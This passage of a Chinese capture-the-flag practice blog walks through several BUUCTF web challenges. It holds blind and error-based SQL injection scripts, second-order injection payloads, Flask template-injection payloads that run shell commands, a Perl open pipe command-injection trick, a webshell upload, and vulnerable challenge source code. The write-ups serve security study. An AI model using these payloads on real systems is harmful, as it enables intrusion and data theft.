&quot;(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)        res &#x3D; requests.get(url+gets)        if &quot;your score is: 100&quot; in res.text:            data +&#x3D; chr(j)            print(data)            k &#x3D; 1            break    if(k &#x3D;&#x3D; 0):        print(&quot;err!&quot;)        exit()    </code></pre><p>因为网络问题加了判断，结果就是跑一会就停了，只能一段一段的跑了</p><p>一定是buu flag太长了（</p><p>算是第一次自己写脚本了</p><p>遍历属实跑的太慢了，抽空学一下二分法的写法</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210919002507491.png" alt="image-20210919002507491"></p><p>flag{d8fd8842-58bd-4a88-bf0c-8e73811797a4}</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134432965.png" alt="image-20210921134432965"></p><p>涉及了php的伪随机</p><p>如果mt_srand使用同一个seed，生成的随机数是可以爆破出seed的</p><p>查看源码找到check.php</p><pre class="language-php" data-language="php"><code class="language-php">pbEzqyRCJP&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show &#x3D; substr($str, 0, 10);echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;);</code></pre><p>知道前几位了</p><p>根据生成算法逆向出满足php_mt_seed工具要求的参数（百度抄的</p><pre class="language-none"><code class="language-none">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2&#x3D;&#39;ENxxxZwNwR&#39;str3 &#x3D; str1[::-1]length &#x3D; len(str2)res&#x3D;&#39;&#39;for i in range(len(str2)):      for j in range(len(str1)):        if str2[i] &#x3D;&#x3D; str1[j]:            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134815768.png" alt="image-20210921134815768"></p><p>放到php_mt_seed里跑种子</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134854213.png" alt="image-20210921134854213"></p><p>再利用这个脚本得到最后的值</p><pre class="language-none"><code class="language-none">&lt;?phpmt_srand(499600072);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str;?&gt;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134936468.png" alt="image-20210921134936468"></p><p>吐槽一下，工业互联网的时候看见一个类似的题，照着这个题的wp没跑出来，今天才知道是php_mt_seed的问题，虽然感觉很离谱</p><p>官网下的爆不出seed，从这里下的可以<a href="https://download.openwall.net/pub/projects/php_mt_seed/">Index of /pub/projects/php_mt_seed (openwall.net)</a></p><p>还有就是一样的种子在php版本不一样的时候出来的值也不一样</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921135243406.png" alt="image-20210921135243406"></p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><pre class="language-none"><code class="language-none">&lt;?phpinclude &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.phpif (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;$secret &#x3D; bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess &#x3D; (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;  &#125; else &#123;    $message &#x3D; &#39;Wrong.&#39;;  &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt;  &lt;&#x2F;head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt;    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt;    &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;    &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt;    &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt;&lt;?php &#125; ?&gt;    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt;      &lt;input type&#x3D;&quot;submit&quot;&gt;    &lt;&#x2F;form&gt;  &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>这里我本来以为是php伪随机数的漏洞，结果最后查了一下发现是basename函数的漏洞</p><p>它会忽略后面的[\x80-\xff]范围内的字符串，即非ascii字符。例子如下：</p><pre class="language-none"><code class="language-none">php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\x80&quot;));&#39; &#x2F;&#x2F; config.phpphp -r &#39;print(basename(&quot;\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php</code></pre><p><strong>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021163516849.png" alt="image-20211021163516849"></p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>源码泄露</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021165221385.png" alt="image-20211021165221385"></p><p>下载image.php.bak</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &quot;config.php&quot;;$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id&#x3D;addslashes($id);$path&#x3D;addslashes($path);$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image&#x2F;jpeg&quot;);readfile($path);</code></pre><p>GET方式传入变量id的值，若没有则为1<br>GET方式传入变量path的值，若没有则为空<br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，单引号（&#39;）、双引号（&quot;）、反斜杠（\）<br>str_replace()函数将两个变量内的\0、%00、&#39;、&#39;都替换为空<br>将变量$id与$path拼接进SQL语句<br>脚本：</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;f99fde09-be38-4b5a-bea6-2362fb4115e4.node4.buuoj.cn:81&#x2F;image.php?id&#x3D;\\0&#39;&amp;path&#x3D;&quot;payload1 &#x3D; r&quot;or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; --+&quot;payload2 &#x3D; r&quot;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;payload3 &#x3D; r&quot;or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;payload4 &#x3D; r&quot;or ascii(substr((select password from users),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;database &#x3D; &quot;&quot;for i in range(1,1000):low &#x3D; 32high &#x3D; 128mid &#x3D; (low + high) &#x2F;&#x2F; 2while(low &lt; high):payload &#x3D; payload4.format(i,mid)new_url &#x3D; url + payloadr &#x3D; requests.get(new_url)if &quot;JFIF&quot; in r.text:low &#x3D; mid + 1else:high &#x3D; midmid &#x3D; (low + high) &#x2F;&#x2F; 2if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 128):breakdatabase +&#x3D; chr(mid)print(database)</code></pre><p>得到密码和用户名登录</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180732197.png" alt="image-20211021180732197"></p><p>登录后是个文件上传的页面</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180749445.png" alt="image-20211021180749445"></p><p>这里要用文件名传一句话木马</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184513558.png" alt="image-20211021184513558"></p><p>在上传后的目录可以看到上传的文件名但是不能访问上传文件的内容</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184345858.png" alt="image-20211021184345858"></p><p>不能用php就用短标签代替</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184319466.png" alt="image-20211021184319466"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184415617.png" alt="image-20211021184415617"></p><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>第一次遇见二次注入的题，正好学一下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026234512946.png" alt="image-20211026234512946"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026234523294.png" alt="image-20211026234523294"></p><p>源码里有个file，猜测有文件包含，可以利用伪协议读取这几个页面的源码</p><p>change.php页面</p><pre class="language-sql" data-language="sql"><code class="language-sql">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg &#x3D; &#39;&#39;;    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;    $user_name &#x3D; $_POST[&quot;user_name&quot;];    $address &#x3D; addslashes($_POST[&quot;address&quot;]);    $phone &#x3D; $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg &#x3D; &#39;no sql inject!&#39;;    &#125;else&#123;        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;        $fetch &#x3D; $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row &#x3D; $fetch-&gt;fetch_assoc();        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];        $result &#x3D; $db-&gt;query($sql);        if(!$result) &#123;            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        &#125;        $msg &#x3D; &quot;订单修改成功&quot;;    &#125; else &#123;        $msg &#x3D; &quot;未找到订单!&quot;;    &#125;&#125;else &#123;    $msg &#x3D; &quot;信息不全&quot;;&#125;</code></pre><p>主要的漏洞点就在change.php</p><p>因为其他输入位置过滤的太多，基本能注入的都被过滤了，所以只能利用address</p><p>在创建address时虽然对输入的数据进行了addslashes过滤</p><p>但之后还会对旧address进行一次sql查询</p><p>因此可以利用二次注入，再结合报错注入，和load_file函数读取flag文件</p><p>在创建时在地址中输入注入语句</p><p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</p><p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)#</p><p>（这里之所以要看flag.txt根据师傅们的博客推测是纯靠猜的</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027000523555.png" alt="image-20211027000523555"></p><p>在修改地址的时候就会重新调用这个sql语句，报错输出flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027000543438.png" alt="image-20211027000543438"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>一眼ssti，然后就不会了（</p><p>f12看到源码注释，get方式，参数为search</p><p>试一下传49确定是ssti</p><pre class="language-none"><code class="language-none">config 也是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值。&#123;&#123; config.items() &#125;&#125;    &#x2F;&#x2F; 查看配置项目的信息  </code></pre><p>例一：<br>warnings.catch_warnings类</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre><p>PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’]</p><p>最后获取flag</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre><p>例二：</p><pre class="language-none"><code class="language-none">class’site._Printer’类&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre><p>获取flag</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre><p>例三：<br>popen</p><pre class="language-none"><code class="language-none">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,</code></pre><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>这也是个二次注入</p><p>注册后登录再修改密码</p><p>利用报错注入</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028162141941.png" alt="image-20211028162141941"></p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028162259138.png" alt="image-20211028162259138"></p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))#</p><p>离谱，被骗了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028163357632.png" alt="image-20211028163357632"></p><p>重新查表</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028170524356.png" alt="image-20211028170524356"></p><p>这一看就是没输出全</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028170804487.png" alt="image-20211028170804487"></p><p>？？？</p><p>这个字段里加了一堆没用的数据</p><p>只能用正则regexp过滤一下</p><p>ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028171620967.png" alt="image-20211028171620967"></p><p>还是没输出全</p><p>之后就要用逆序输出了</p><p>ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028171750860.png" alt="image-20211028171750860"></p><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>进去后是php代码</p><p>直接抄的其他师傅的注释</p><pre class="language-none"><code class="language-none">&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);  &#x2F;&#x2F; explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   &#x2F;&#x2F; “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。     @mkdir($sandbox);    @chdir($sandbox);     &#x2F;&#x2F; 改变当前的目录到$sandbox    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     &#x2F;&#x2F; escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);  &#x2F;&#x2F; pathinfo() 函数以数组的形式返回文件路径的信息。    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));   &#x2F;&#x2F; basename() 函数返回路径中的文件名部分。    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__);    &#x2F;&#x2F; 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。</code></pre><p>简单来说就是利用传参中的url执行命令，然后将结果保存在filename中</p><p>有几个地方不太懂</p><p>​    1.百度的wp都说这里利用的perl脚本里的open漏洞</p><pre class="language-none"><code class="language-none">利用GET中的open函数漏洞。open函数在GET命令被调用时执行，也就是第五行执行GET命令时，perl语言会调用open命令，漏洞就存在于open命令对于文件的处理上，关于这个漏洞，外国人有文章，是这样写的：Perl saw that your “file” ended with a “pipe” (verticalbar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”&#39;s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you.翻译过来意思是perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。</code></pre><p>​    2.这里执行url传入的命令的前提是要求有个以该命令命名的文件</p><p>?url=/&amp;filename=1.txt 看一下根目录</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205139421.png" alt="image-20211103205139421"></p><p>有两个和flag有关的文件，试flag无果，只能试试readflag</p><p>?url=&amp;filename=bash -c /readflag|</p><p>先创建一个bash -c /readflag|的文件</p><p>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</p><p>利用url执行命令</p><p>/sandbox/md5值/bash -c /readflag|</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205748482.png" alt="image-20211103205748482"></p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002530209.png" alt="image-20211115002530209"></p><p>json格式</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002559767.png" alt="image-20211115002559767"></p><p>cmd</p><p>可以猜到执行命令格式是</p><p>{&quot;cmd&quot;:&quot;ls&quot;}</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002808993.png" alt="image-20211115002808993"></p><p>还可以直接get参数进去</p><p>但是cat参数没法直接用，还有过滤，不过可以用换行符绕过过滤</p><pre><code>&lt;?phpputenv(&#39;PATH=/home/rceservice/jail&#39;);设置了环境变量的PATH，导致不能使用相对路径，只能用绝对路径：if (isset($_REQUEST[&#39;cmd&#39;])) &#123;    $json = $_REQUEST[&#39;cmd&#39;];if (!is_string($json)) &#123;    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;&#125; elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) &#123;    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;&#125; else &#123;    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;    $cmd = json_decode($json, true)[&#39;cmd&#39;];    if ($cmd !== NULL) &#123;        system($cmd);    &#125; else &#123;        echo &#39;Invalid input&#39;;    &#125;    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;&#125;&#125;?&gt;</code></pre><p>cat命令不能用，原因可能是当前的PATH下没有cat，这里需要也需要用绝对路径：</p><blockquote><p><a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Linux">Linux</a>命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p></blockquote><p>cat 读出源码（我也很想知道网上的wp没源码之前怎么想到这么绕过的</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003758590.png" alt="image-20211115003758590"></p><p>然后找flag在的目录</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003933107.png" alt="image-20211115003933107"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004010321.png" alt="image-20211115004010321"></p><p>找到之后利用cat读出来</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004044237.png" alt="image-20211115004044237"></p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>有git泄露，用githack跑一遍，然后利用git log --reflog查看历史提交，再利用git reset回滚版本，得到原始的代码</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;    header(&quot;Location: .&#x2F;login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category &#x3D; addslashes($_POST[&#39;category&#39;]);    $title &#x3D; addslashes($_POST[&#39;title&#39;]);    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into board            set category &#x3D; &#39;$category&#39;,                title &#x3D; &#39;$title&#39;,                content &#x3D; &#39;$content&#39;&quot;;    $result &#x3D; mysql_query($sql);    header(&quot;Location: .&#x2F;index.php&quot;);    break;case &#39;comment&#39;:    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    $num &#x3D; mysql_num_rows($result);    if($num&gt;0)&#123;    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;$category&#39;,                content &#x3D; &#39;$content&#39;,                bo_id &#x3D; 